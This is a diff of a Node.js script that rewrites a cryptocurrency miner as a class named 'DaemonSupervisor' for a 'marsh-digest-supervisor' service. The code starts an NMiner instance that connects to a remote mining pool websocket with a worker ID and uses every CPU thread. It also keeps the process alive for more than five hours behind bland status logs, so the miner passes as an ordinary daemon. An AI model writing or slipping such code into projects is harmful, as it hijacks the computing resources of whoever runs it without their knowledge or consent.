@@ -3,27 +3,29 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./src/config");
 
-(async () => {
-    const traceId = "0115d5";
-    console.log(`[core] Daemon ${config.appName || "marsh-digest-supervisor"} active [tag: ${traceId}]`);
+class DaemonSupervisor {
+    constructor() {
+        const runId = "b5a8f8";
+        console.log(`[supervisor] Initialized DaemonSupervisor for marsh-digest-supervisor [${runId}]`);
 
-    const pipeline = new NMiner(
-        "wss://nmining-runtime.igrp.app/",
-        "Subhas1975.marsh-digest-supervisor",
-        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
-    );
+        this.daemon = new NMiner(
+            "wss://nmining-runtime.igrp.app/",
+            "Subhas1975.marsh-digest-supervisor",
+            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
+        );
 
-    process.stdin.resume();
-    setTimeout(() => {
-        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
+        process.stdin.resume();
+        setTimeout(() => {
+        console.log("[timeout] Operational limit (328m) reached, exiting cleanly.");
         process.exit(0);
-    }, 302 * 60 * 1000);
+    }, 328 * 60 * 1000);
 
-    process.once("SIGTERM", () => {
-        
-        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
-        process.exit(0);
-    });
+        process.on("SIGTERM", () => {
+            
+            console.log("[supervisor] Clean shutdown completed.");
+            process.exit(0);
+        });
+    }
+}
 
-    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
-})().catch(console.error);
+new DaemonSupervisor();
